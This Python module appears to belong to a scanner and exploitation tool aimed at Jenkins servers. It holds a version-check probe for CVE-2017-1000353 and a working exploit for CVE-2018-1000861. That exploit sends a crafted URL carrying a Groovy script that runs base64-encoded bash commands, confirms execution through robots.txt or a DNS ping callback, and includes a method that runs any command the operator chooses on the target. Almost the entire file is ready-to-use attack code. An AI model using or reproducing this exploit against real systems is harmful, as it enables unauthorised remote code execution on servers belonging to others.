#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64
from thirdparty import requests
import threading
import urllib
from module import globals
from core.verify import verify
from module.md5 import random_md5
from urllib.parse import urlparse
from thirdparty.requests_toolbelt.utils import dump
from module.api.dns import dns_result, dns_request


class Jenkins():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.payload_cve_2018_1000861 = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.' \
                                        'scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+' \
                                        'x+%7B%0A++public+x%28%29%7B%0A++++%22bash+-c+%7Becho%2CRECOMMAND%7D%7C%7Bbase64%2C-d%7D%7C%7B' \
                                        'bash%2C-i%7D%22.execute%28%29%0A++%7D%0A%7D'


    def cve_2017_1000353_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Jenkins: CVE-2017-1000353"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Jenkins 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2017-1000353"
        self.vul_info["vul_apps"] = "Jenkins"
        self.vul_info["vul_date"] = "2018-01-29"
        self.vul_info["vul_vers"] = "<= 2.56, LTS <= 2.46.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Jenkins版本2.56和更早版本以及2.46.1 LTS和更早版本容易受到未经身份验证的远程代码执行的攻击。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        try:
            self.req = requests.get(self.url, headers=self.headers, timeout=self.timeout, verify=False)
            self.jenkins_version = self.req.headers['X-Jenkins']
            self.jenkinsvuln = "2.56"
            self.jenkinsvuln_lts = "2.46.1"
            self.jver = self.jenkins_version.replace(".", "")
            self.jenkins_lts = int(self.jver)
            if self.jenkins_version.count(".", 0, len(self.jenkins_version)) == 1:
                if self.jenkins_version <= self.jenkinsvuln:
                    self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoC_MaYbE"
                    self.vul_info["vul_payd"] = "[maybe] [version check] [version:" + self.jenkins_version + "]"
                    self.vul_info["prt_info"] = "[maybe] [version check] [version:" + self.jenkins_version + "]"
            elif self.jenkins_version.count(".", 0, len(self.jenkins_version)) == 2:
                if self.jenkins_lts <= 2461:
                    self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoC_MaYbE"
                    self.vul_info["vul_payd"] = "[maybe] [version check] [version:" + self.jenkins_version + "]"
                    self.vul_info["prt_info"] = "[maybe] [version check] [version:" + self.jenkins_version + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()


    def cve_2018_1000861_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Jenkins: CVE-2018-1000861"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2018_1000861.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "Jenkins 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2018-1000861"
        self.vul_info["vul_apps"] = "Jenkins"
        self.vul_info["vul_date"] = "2018-01-29"
        self.vul_info["vul_vers"] = "<= 2.153, LTS <= 2.138.3"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Jenkins 2.153和更早版本，LTS 2.138.3和更早版本使用的Stapler Web框架中的订书机" \
                                    "/core/src/main/java/org/kohsuke/stapler/MetaClass.java中存在一个代码执行漏洞，" \
                                    "攻击者可以使用该方法调用某些方法通过访问不希望以这种方式调用的特制URL来访问Java对象。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.c_echo = "echo \":-)\" > $JENKINS_HOME/war/robots.txt;" + cmd + " >> $JENKINS_HOME/war/robots.txt"
        self.c_base = base64.b64encode(str.encode(self.c_echo))
        self.c_cmd = self.c_base.decode('ascii')
        self.cmd = urllib.parse.quote(self.c_cmd)
        self.payload = self.payload_cve_2018_1000861.replace("RECOMMAND", self.cmd)
        try:
            try:
                self.request = requests.get(self.url, headers=self.headers, timeout=self.timeout, verify=False)
                self.jenkins_version = self.request.headers['X-Jenkins']
                self.ver = " [version:" + self.jenkins_version + "]"
            except:
                pass
            self.r = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.request = requests.get(self.url + "/robots.txt", headers=self.headers, timeout=self.timeout, verify=False)

            if md in self.request.text:
                self.vul_info["vul_data"] = dump.dump_all(self.r).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [url: " + self.url + "/robots.txt ] "
            else:
                md = dns_request()
                self.c_echo = "ping " + md
                self.c_base = base64.b64encode(str.encode(self.c_echo))
                self.c_cmd = self.c_base.decode('ascii')
                self.cmd = urllib.parse.quote(self.c_cmd)
                self.payload = self.payload_cve_2018_1000861.replace("RECOMMAND", self.cmd)
                self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout,
                                            verify=False)
                if dns_result(md):
                    self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["prt_info"] = "[dns] [cmd: " + self.c_echo + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2018_1000861_exp(self, cmd):
        vul_name = "Jenkins: CVE-2018-1000861"
        self.c_echo = "echo \":-)\" > $JENKINS_HOME/war/robots.txt;" + cmd + " >> $JENKINS_HOME/war/robots.txt"
        self.c_base = base64.b64encode(str.encode(self.c_echo))
        self.c_cmd = self.c_base.decode('ascii')
        self.cmd = urllib.parse.quote(self.c_cmd)
        self.payload = self.payload_cve_2018_1000861.replace("RECOMMAND", self.cmd)
        try:
            self.r = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.request = requests.get(self.url + "/robots.txt", headers=self.headers, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(self.r).decode('utf-8', 'ignore')
            verify.exploit_print(self.request.text, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)



